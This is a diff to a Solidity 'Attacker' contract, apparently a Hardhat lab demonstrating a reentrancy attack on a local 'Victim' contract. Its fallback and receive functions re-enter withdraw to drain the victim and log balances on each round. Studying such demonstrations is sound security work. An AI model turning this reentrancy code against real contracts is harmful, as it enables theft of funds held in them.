@@ -1,50 +1,45 @@
 // SPDX-License-Identifier: MIT
 
 pragma solidity ^0.8.13;
-
 import "./Victim.sol";
+
 import "hardhat/console.sol";
 
 contract Attacker{
+    uint number;
     Victim victim;
-    address public owner;
-    uint public i;
 
-    modifier ownerOnly(){
-        require(msg.sender == owner, "OWNER_REQUIRED");
-        _;
-    }
+    constructor () payable{}
 
     fallback() external payable{
         if(msg.sender == address(victim)){
-            i += 1;
-            console.log("[attack fallback] %s times called, attack_balance:%s , re_balance:%s ", 
-                        i, address(this).balance/(10**18), address(victim).balance/(10**18));
-            victim.withdraw(address(this), msg.value);
+            number += 1;
+            console.log('\nAttack times', number);
+            console.log('Attacker balance', address(this).balance/(10**18));
+            console.log('Victim balance', address(victim).balance/(10**18));
+            console.log('-------------------------------------------------');
+            victim.withdraw(address(this), 1 ether);
         }
     }
 
     receive() external payable{
         if(msg.sender == address(victim)){
-            i += 1;
-            console.log("[attack fallback] %s times called, attack_balance:%s , re_balance:%s ", 
-                        i, address(this).balance/(10**18), address(victim).balance/(10**18));
-            victim.withdraw(address(this), msg.value);
+            number += 1;
+            console.log('\nAttack times', number);
+            console.log('Attacker balance', address(this).balance/(10**18));
+            console.log('Victim balance', address(victim).balance/(10**18));
+            console.log('-------------------------------------------------');
+            victim.withdraw(address(this), 1 ether);
         }
     }
 
-    constructor() payable{
-        owner = msg.sender;
-    }
-
-    function setVictim(Victim _victim) public ownerOnly{
+    function setVictim(Victim _victim) public{
         victim = _victim;
     }
 
-    function attack(uint _amount) public ownerOnly{
-        victim.deposit{value: _amount}();
-        console.log('Deposit', _amount);
-        victim.withdraw(address(this), _amount / 2);
+    function attack(uint _value) public{
+        victim.deposit(_value);
+        victim.withdraw(address(this), _value / 2);
     }
-    
+
 }
